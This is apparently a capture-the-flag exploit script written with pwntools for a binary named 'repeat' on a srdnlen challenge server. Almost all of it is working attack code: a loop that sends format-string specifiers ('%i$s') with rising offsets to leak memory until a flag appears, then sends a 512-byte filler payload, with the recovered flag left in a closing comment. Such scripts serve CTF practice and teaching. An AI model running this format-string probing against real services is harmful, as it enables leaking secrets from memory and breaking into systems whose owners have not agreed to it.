#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from ctypes import CDLL

context.terminal = [
    "kitty",
    "@",
    "launch",
    "--location=hsplit",
    # "--location=vsplit",
    "--wait-for-child-to-exit"
]

context.log_level = 'error' # se non vuoi vedere i loggin
exe = context.binary = ELF(args.EXE or './repeat')
lib = CDLL(exe.libc.path)
host = args.HOST or 'srdnlen.doliv.cc'
port = int(args.PORT or 34004)

def unpack(txt):
    return u64(txt.ljust(8, b'\x00'))

def vers_libc(function):
    return ELF(pwnlib.libcdb.search_by_symbol_offsets(function, select_index=10))

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *go+160
continue
'''.format(**locals())

# -- Exploit goes here --

i = 5
while True:
    try:
        io = start()
        i+=1
        payload = b"A" * 512
        n = 0x200
        # print(n)
        io.sendlineafter(b": ", f"%{i}$s".encode())
        resp = io.recvline()
        print(i, resp)
        if b"FLAG" in resp:
            print(resp)
            input("")
        io.sendlineafter(b": ", payload)

        io.close()
    except BaseException:
        print(i)
        pass

# srdnlen{eater_egg_with_no_leet}
